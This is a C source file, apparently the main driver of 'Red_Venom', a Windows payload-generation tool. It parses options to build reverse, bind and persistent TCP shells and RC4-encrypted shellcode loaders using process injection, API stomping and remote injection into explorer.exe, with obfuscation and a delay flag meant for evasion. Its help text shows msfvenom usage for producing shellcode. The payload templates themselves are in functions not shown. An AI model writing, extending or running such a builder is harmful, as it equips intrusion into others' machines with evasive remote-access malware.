#include "struct.h"


//===================================================================================================//
// Help & View
//===================================================================================================//
VOID print_usage() {
    system("cls");
    system("chcp 65001 > nul");
    system("title Red_Venom - by Y.JANBOUBI");
    printf("\n");
    printf("\033[38;2;255;0;0m");
    printf("╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\n");
    printf("╚════════════════════════════════════════ RED_VENOM - Security Tool ══════════════════════════════════════════╝\n");
    printf("╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\n\n");
    printf("            	\033[38;2;255;0;0m██████╗ ███████╗██████╗        ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗\n");
    printf("	        \033[38;2;232;0;0m██╔══██╗██╔════╝██╔══██╗       ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║\n");
    printf("	        \033[38;2;209;0;0m██████╔╝█████╗  ██║  ██║       ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║\n");
    printf(" 	        \033[38;2;186;0;0m██╔══██╗██╔══╝  ██║  ██║       ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║\n");
    printf(" 	        \033[38;2;163;0;0m██║  ██║███████╗██████╔╝███████╗╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║\n");
    printf(" 	        \033[38;2;139;0;0m╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝ ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝\n\n");
    printf("\033[38;2;255;0;0m");
    printf("╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\n");
    printf("╚════════════════════════════════════════ Developed BY Y.JANBOUBI V1.0 ═══════════════════════════════════════╝\n");
    printf("╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\n\n");
    printf("\033[38;5;250m");
}
VOID help(char* arg0) {
    print_usage();
    printf("\033[38;2;232;0;0m");
    printf("Payload TCP Types:\n");
    printf("\033[38;5;250m");
    printf("  1 or Reverse_tcp         : TCP reverse shell\n");
    printf("  2 or Bind_Shell          : TCP bind shell\n");
    printf("  3 or Persistence_Shell   : Persistent reverse shell (EXE format only)\n");
    printf("\033[38;2;232;0;0m");
    printf("Payload Injection Types:\n");
    printf("\033[38;5;250m");
    printf("  4 or Mapping_Injection   : Mapping Memory Injection\n");
    printf("  5 or Private_Injection   : Private Memory Injection\n");
    printf("  6 or API_Stomping        : Local API Stomping (EXE format only)\n");
    printf("  7 or Process_Injection   : Local process Injection\n");
    printf("  8 or Remote_P_Injection  : Remote process Injection (default \"explorer.exe\")\n");
    printf("\033[38;2;232;0;0m");
    printf("Options:\n");
    printf("\033[38;5;250m");
    printf("  -t <Payload_Type>        : Payload type\n");
    printf("  -i <Ip>                  : Target IP address\n");
    printf("  -p <Port>                : Target port number\n");
    printf("  -f <Payload.bin>         : Payload file\n");
    printf("  -o <Format>              : Output format (EXE, DLL)\n");
    printf("  -s                       : Sleep \"30.s\" seconds before running\n");
    printf("  -obf                     : Obfuscated Payload\n");
    printf("  -r <Process>             : Name of Remote Process (format == Name.exe) \n");
    printf("\033[38;2;232;0;0m");
    printf("Usage Examples:\n");
    printf("\033[38;5;250m");
    printf("  %s -t <Payload_TCP_Types> -i <LHOST> -p <LPORT> -o <Format>\n", arg0);
    printf("  %s -t <Bind_Shell> -p <LPORT> -o <Format>\n", arg0);
    printf("  %s -t <Payload_Injection_Types> -f <file.bin> -o <Format>\n", arg0);
    printf("\033[38;2;232;0;0m");
    printf("Note:\n");
    printf("\033[38;5;250m");
    printf("  => For_running (DLL), use (\"rundll32.exe\") , or run (\"DLL-Runner.bat\")\n");
    printf("  => Ex_Of_File.bin == msfvenom -p <payload> LHOST=<ip> LPORT=<port_nbr> EXITFUNC=thread -o file.bin\n");
    getchar();
    printf("\033[38;5;250m");
}
// Validate ip
int is_valid_ip(const char* ip) {
    if (!ip) return 0;
    int a, b, c, d;

    if (sscanf_s(ip, "%d.%d.%d.%d", &a, &b, &c, &d) != 4) return 0;

    if (a < 0 || a > 255 || b < 0 || b > 255 || c < 0 || c > 255 || d < 0 || d > 255) return 0;
    return 1;
}
// Validate format (EXE or DLL)
int is_valid_format(const char* format) {
    if (!format) return -1;
    if (strcmp(format, "EXE") == 0 || strcmp(format, "exe") == 0) return 1;
    if (strcmp(format, "DLL") == 0 || strcmp(format, "dll") == 0) return 2;
    return -1;
}
// Validate port number
int is_valid_port(const char* port) {
    if (!port) return 0;
    int p = atoi(port);
    return (p > 0 && p <= 65535);
}


//===================================================================================================//
// main
//===================================================================================================//
int main(int argc, char* argv[]) {


    char drive[_MAX_DRIVE];
    char dir[_MAX_DIR];
    char fname[_MAX_FNAME];
    char ext[_MAX_EXT];

    _splitpath_s(argv[0], drive, _MAX_DRIVE, dir, _MAX_DIR, fname, _MAX_FNAME, ext, _MAX_EXT);
    char executable_name[_MAX_FNAME + _MAX_EXT];
    strcpy_s(executable_name, _MAX_FNAME + _MAX_EXT, fname);
    strcat_s(executable_name, _MAX_FNAME + _MAX_EXT, ext);

    if (check_mingw_installed(executable_name) != 0) {
        return 1;
    }

    if (argc == 2 && (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0)) {
        help(executable_name);
        return 0;
    }

    if (argc < 2) {
        print_usage();
        printf("[!] Invalid arguments\n");
        printf("[?] For help: %s -h or --help\n", executable_name);
        getchar();
        printf("\033[38;5;250m");
        return 1;
    }

    int payload_type = -1;
    char* ip = NULL;
    char* port = NULL;
    char* filename = NULL;
    char* format = NULL;
    int sourc_flag = 0;
    int sleep_flag = 0;
    int obf_flag = 0;
    int compail_flage = 0;
    char* rprocess = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            payload_type = atoi(argv[++i]);
            if (payload_type == 0) {
                if (strcmp(argv[i], "Reverse_tcp") == 0) payload_type = 1;
                else if (strcmp(argv[i], "Bind_Shell") == 0) payload_type = 2;
                else if (strcmp(argv[i], "Persistence_Shell") == 0) payload_type = 3;
                else if (strcmp(argv[i], "Mapping_Injection") == 0) payload_type = 4;
                else if (strcmp(argv[i], "Private_Injection") == 0) payload_type = 5;
                else if (strcmp(argv[i], "API_Stomping") == 0) payload_type = 6;
                else if (strcmp(argv[i], "Process_Injection") == 0) payload_type = 7;
                else if (strcmp(argv[i], "Remote_P_Injection") == 0) payload_type = 8;
            }
        }
        else if (strcmp(argv[i], "-i") == 0 && i + 1 < argc) {
            ip = argv[++i];
        }
        else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            port = argv[++i];
        }
        else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
            filename = argv[++i];
        }
        else if (strcmp(argv[i], "-o") == 0 && i + 1 < argc) {
            format = argv[++i];
        }
        else if (strcmp(argv[i], "-s") == 0) {
            sleep_flag = 1;
        }
        else if (strcmp(argv[i], "-obf") == 0) {
            obf_flag = 1;
        }
        else if (strcmp(argv[i], "-r") == 0) {
            rprocess = argv[++i];
        }
        else {
            printf("\033[38;2;255;0;0m");
            printf("[!] Invalid option: %s\n", argv[i]);
            printf("\033[38;2;0;255;0m");
            printf("[*] For help: %s -h or --help\n", executable_name);
            printf("\033[38;5;250m");
            return 1;
        }
    }

    if (payload_type < 1 || payload_type > 8) {
        printf("\033[38;2;255;0;0m");
        printf("[!] Invalid payload type\n");
        printf("\033[38;2;0;255;0m");
        printf("[*] For help: %s -h or --help\n", executable_name);
        printf("\033[38;5;250m");
        return 1;
    }

    if (payload_type >= 1 && payload_type <= 3) {
        if (payload_type != 2 && (!ip || !is_valid_ip(ip))) {
            printf("\033[38;2;255;0;0m");
            printf("[!] Invalid or missing IP address\n");
            printf("\033[38;2;0;255;0m");
            printf("[*] For help: %s -h or --help\n", executable_name);
            printf("\033[38;5;250m");
            return 1;
        }
        if (!port || !is_valid_port(port)) {
            printf("\033[38;2;255;0;0m");
            printf("[!] Invalid or missing port number (0 > port < 65535)\n");
            printf("\033[38;2;0;255;0m");
            printf("[*] For help: %s -h or --help\n", executable_name);
            printf("\033[38;5;250m");
            return 1;
        }
        if (!format || is_valid_format(format) == -1) {
            printf("\033[38;2;255;0;0m");
            printf("[!] Invalid or missing format (must be EXE or DLL)\n");
            printf("\033[38;2;0;255;0m");
            printf("[*] For help: %s -h or --help\n", executable_name);
            printf("\033[38;5;250m");
            return 1;
        }
        if (payload_type == 3 && is_valid_format(format) != 1) {
            printf("\033[38;2;255;0;0m");
            printf("[!] Invalid format for Persistence_Shell\n");
            printf("[*] Persistence_Shell requires EXE format\n");
            printf("\033[38;2;0;255;0m");
            printf("[*] For help: %s -h or --help\n", executable_name);
            printf("\033[38;5;250m");
            return 1;
        }

        if (payload_type == 2 && sleep_flag == 1) {
            printf("\033[38;2;255;0;0m");
            printf("[!] Invalid option for Bind_Shell\n");
            printf("[*] Bind_Shell doesn't have sleep option\n");
            printf("\033[38;2;0;255;0m");
            printf("[*] For help: %s -h or --help\n", executable_name);
            printf("\033[38;5;250m");
            return 1;
        }

        if (payload_type == 2 && sleep_flag == 1) {
            printf("\033[38;2;255;0;0m");
            printf("[!] Invalid option for Bind_Shell\n");
            printf("[*] Bind_Shell doesn't have sleep option\n"); 
            printf("\033[38;2;0;255;0m");
            printf("[*] For help: %s -h or --help\n", executable_name);
            printf("\033[38;5;250m");
            return 1;
        }

        char* buffer = (char*)malloc(BUFFER_SIZE);
        if (!buffer) {
            fprintf(stderr, "[!] Failed to allocate buffer\n");
            return 1;
        }

        switch (payload_type) {
        case 1: 
            if (argc < (sleep_flag ? 9 : 8)) {
                printf("\033[38;2;255;0;0m");
                printf("[!] Invalid arguments for Reverse_tcp\n");
                printf("[*] Usage: %s -t 1 -i <ip> -p <port> -o <format> [-s] [-obf]\n", executable_name);
                printf("\033[38;5;250m");
                free(buffer);
                return 1;
            }
            if (sleep_flag) {
                if (obf_flag) {
                    if (is_valid_format(format) == 1) {
                        obf_deley_2_tcp__time(buffer, BUFFER_SIZE, ip, port);
                    }
                    else {
                        obf_deley_2_tcp__time_dll(buffer, BUFFER_SIZE, ip, port);
                    }
                }
                else {
                    if (is_valid_format(format) == 1) {
                        deley_source_2_tcp__time(buffer, BUFFER_SIZE, ip, port);
                    }
                    else {
                        deley_source_2_tcp__time_dll(buffer, BUFFER_SIZE, ip, port);
                    }
                }
            }
            else {
                if (obf_flag) {
                    if (is_valid_format(format) == 1) {
                        obf_2_tcp__time(buffer, BUFFER_SIZE, ip, port);
                    }
                    else {
                        obf_2_tcp__time_dll(buffer, BUFFER_SIZE, ip, port);
                    }
                }
                else {
                    if (is_valid_format(format) == 1) {
                        _source_2_tcp__time(buffer, BUFFER_SIZE, ip, port);
                    }
                    else {
                        _source_2_tcp__time_dll(buffer, BUFFER_SIZE, ip, port);
                    }
                }
            }
            generate_output(format, buffer, compail_flage);
            break;

        case 2: 
            if (argc < (sleep_flag ? 7 : 6)) {
                printf("\033[38;2;255;0;0m");
                printf("[!] Invalid arguments for Bind_Shell\n");
                printf("[*] Usage: %s -t 2 -p <port> -o <format> [-s] [-obf]\n", executable_name);
                printf("\033[38;5;250m");
                free(buffer);
                return 1;
            }
            if (obf_flag) {
                if (is_valid_format(format) == 1) {
                    obf_3_bind_tcp(buffer, BUFFER_SIZE, port);
                }
                else {
                    obf_3_bind_tcp_dll(buffer, BUFFER_SIZE, port);
                }
            }
            else {
                if (is_valid_format(format) == 1) {
                    _source_3_bind_tcp(buffer, BUFFER_SIZE, port);
                }
                else {
                    _source_3_bind_tcp_dll(buffer, BUFFER_SIZE, port);
                }
            }


            generate_output(format, buffer, compail_flage);
            break;

        case 3: 
            if (argc < (sleep_flag ? 9 : 8)) {
                printf("\033[38;2;255;0;0m");
                printf("[!] Invalid arguments for Persistence_Shell\n");
                printf("[*] Usage: %s -t 3 -i <ip> -p <port> -o EXE [-s] [-obf]\n", executable_name);
                printf("\033[38;5;250m");
                free(buffer);
                return 1;
            }
            if (sleep_flag) {
                if (obf_flag) {
                    obf_deley_1_tcp_3_time(buffer, BUFFER_SIZE, ip, port);
                }
                else {
                    deley_source_1_tcp_3_time(buffer, BUFFER_SIZE, ip, port);
                }
            }
            else {
                if (obf_flag) {
                    obf_1_tcp_3_time(buffer, BUFFER_SIZE, ip, port);
                }
                else {
                    _source_1_tcp_3_time(buffer, BUFFER_SIZE, ip, port);
                }
            }

            generate_output(format, buffer, compail_flage);
            break;
        }

        free(buffer);
    }

    if (payload_type >= 4 && payload_type <= 8) {
        if (!filename) {
            printf("\033[38;2;255;0;0m");
            printf("[!] Missing payload file for injection type\n");
            printf("\033[38;2;0;255;0m");
            printf("[*] For help: %s -h or --help\n", executable_name);
            printf("\033[38;5;250m");
            return 1;
        }

        PBYTE pPayload = NULL, pCipherText = NULL, pProtectedKey = NULL, pOriginalKey = NULL;
        DWORD payloadSize = 0;
        DWORD key_size = 32; 
        BYTE HintByte;

        srand((unsigned int)time(NULL));
        HintByte = (BYTE)((rand() % 0xFF) * 2);

        if (!OpenPayloadFile(filename, &pPayload, &payloadSize)) {
            printf("[!] Failed to open payload file: %s\n", filename);
            return 1;
        }

        pCipherText = (PBYTE)malloc(payloadSize);
        if (!pCipherText) {
            printf("[!] Memory allocation failed for cipher text\n");
            free(pPayload);
            return 1;
        }

        memcpy(pCipherText, pPayload, payloadSize);

        RC4GenerateProtectedKey(HintByte, key_size, &pOriginalKey, &pProtectedKey);
        if (!pOriginalKey || !pProtectedKey) {
            printf("[!] Key generation failed\n");
            free(pPayload);
            free(pCipherText);
            return 1;
        }

        if (!Rc4Encrypt(pOriginalKey, key_size, pCipherText, payloadSize)) {
            printf("[!] Encryption failed\n");
            free(pProtectedKey);
            free(pOriginalKey);
            free(pPayload);
            free(pCipherText);
            return 1;
        }

        char* buffer = (char*)malloc(BUFFER_SIZE);
        if (!buffer) {
            printf("[!] Memory allocation failed\n");
            free(pProtectedKey);
            free(pOriginalKey);
            free(pPayload);
            free(pCipherText);
            return 1;
        }

        if ((payload_type == 6 || payload_type == 4 || payload_type == 5 ||
            payload_type == 7 || payload_type == 8) &&
            (!format || is_valid_format(format) == -1)) {
            printf("\033[38;2;255;0;0m");
            printf("[!] This injection type requires a valid format (EXE or DLL)\n");
            printf("\033[38;2;0;255;0m");
            printf("[*] For help: %s -h or --help\n", executable_name);
            printf("\033[38;5;250m");
            free(buffer);
            free(pProtectedKey);
            free(pOriginalKey);
            free(pPayload);
            free(pCipherText);
            return 1;
        }

        if (argc < (sleep_flag ? 8 : 7)) {
            printf("\033[38;2;255;0;0m");
            printf("[!] Invalid arguments for this injection type\n");
            printf("[*] Usage: %s -t <Payload_Injection_Types> -f <file.bin> -o <format> [-s] [-obf]\n", executable_name);
            printf("\033[38;5;250m");
            free(buffer);
            free(pProtectedKey);
            free(pOriginalKey);
            free(pPayload);
            free(pCipherText);
            return 1;
        }

        if (payload_type == 6 && is_valid_format(format) != 1) {
            printf("\033[38;2;255;0;0m");
            printf("[!] Invalid format for API_Stomping\n");
            printf("[*] API_Stomping requires EXE format only\n");
            printf("\033[38;2;0;255;0m");
            printf("[*] For help: %s -h or --help\n", executable_name);
            printf("\033[38;5;250m");
            free(buffer);
            free(pProtectedKey);
            free(pOriginalKey);
            free(pPayload);
            free(pCipherText);
            return 1;
        }


        switch (payload_type) {
        case 4: 
            if (sleep_flag) {
                if (obf_flag) {
                    if (is_valid_format(format) == 1) {
                        obf_deley_4_mapping_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        obf_deley_4_mapping_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
                else {
                    if (is_valid_format(format) == 1) {
                        deley_source_4_mapping_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        deley_source_4_mapping_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
            }
            else {
                if (obf_flag) {
                    if (is_valid_format(format) == 1) {
                        obf_4_mapping_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        obf_4_mapping_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
                else {
                    if (is_valid_format(format) == 1) {
                        _source_4_mapping_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        _source_4_mapping_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
            }

             compail_flage = 1;
             generate_output(format, buffer, compail_flage);
            break;

        case 5:
            if (sleep_flag) {
                if (obf_flag) {
                    if (is_valid_format(format) == 1) {
                        obf_deley_5_process_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        obf_deley_5_process_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
                else {
                    if (is_valid_format(format) == 1) {
                        deley_source_5_process_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        deley_source_5_process_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
            }
            else {
                if (obf_flag) {
                    if (is_valid_format(format) == 1) {
                        obf_5_process_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        obf_5_process_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
                else {
                    if (is_valid_format(format) == 1) {
                        _source_5_process_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        _source_5_process_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
            }

            compail_flage = 1;
            generate_output(format, buffer, compail_flage);
            break;

        case 6: 
            if (sleep_flag) {
                if (obf_flag) {
                    obf_deley_6_API_stompping(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                }
                else {
                    deley_source_6_API_stompping(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                }
            }
            else {
                if (obf_flag) {
                    obf_6_API_stompping(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                }
                else {
                    _source_6_API_stompping(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                }
            }

            compail_flage = 1;
            generate_output(format, buffer, compail_flage);
            break;

        case 7: 
            if (sleep_flag) {
                if (obf_flag) {
                    if (is_valid_format(format) == 1) {
                        obf_deley_5_process_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        obf_deley_5_process_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
                else {
                    if (is_valid_format(format) == 1) {
                        deley_source_5_process_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        deley_source_5_process_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
            }
            else {
                if (obf_flag) {
                    if (is_valid_format(format) == 1) {
                        obf_5_process_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        obf_5_process_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
                else {
                    if (is_valid_format(format) == 1) {
                        _source_5_process_injection(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                    else {
                        _source_5_process_injection_dll(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte);
                    }
                }
            }

            compail_flage = 1;
            generate_output(format, buffer, compail_flage);
            break;

        case 8: 
            if (rprocess == NULL) {
                rprocess = "explorer.exe";
            }
            if (sleep_flag) {
                if (obf_flag) {
                    if (is_valid_format(format) == 1) {

                        obf_deley_7_inject_explorar(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte, rprocess);
                    }
                    else {
                        obf_deley_7_inject_explorar_DLL(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte, rprocess);
                    }
                }
                else {
                    if (is_valid_format(format) == 1) {
                        deley_source_7_inject_explorar(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte, rprocess);
                    }
                    else {
                        deley_source_7_inject_explorar_DLL(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte, rprocess);
                    }
                }
            }
            else {
                if (obf_flag) {
                    if (is_valid_format(format) == 1) {
                        obf_7_inject_explorar(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte, rprocess);
                    }
                    else {
                        obf_7_inject_explorar_DLL(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte, rprocess);
                    }
                }
                else {
                    if (is_valid_format(format) == 1) {
                        _source_7_inject_explorar(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte, rprocess);
                    }
                    else {
                        _source_7_inject_explorar_DLL(buffer, BUFFER_SIZE, pCipherText, payloadSize, pProtectedKey, key_size, HintByte, rprocess);
                    }
                }
            }

            generate_output(format, buffer, compail_flage);
            printf("\033[38;2;255;0;0m");
            printf("[!] Remote process injection == (\"%s\")\n", rprocess);
            printf("\033[38;5;250m");
            break;
        }

        free(buffer);
        free(pProtectedKey);
        free(pOriginalKey);
        free(pPayload);
        free(pCipherText);
    }

    printf("\033[38;2;0;255;0m");
    printf("[+] Payload successfully generated\n");
    printf("\033[38;2;255;0;0m");
    printf("[+] Saved in (\"Output\") folder\n");
    printf("[!] Run (\"Compiled.bat\") for compiled Source file\n");
    printf("\033[38;5;250m");
    return 0;
}

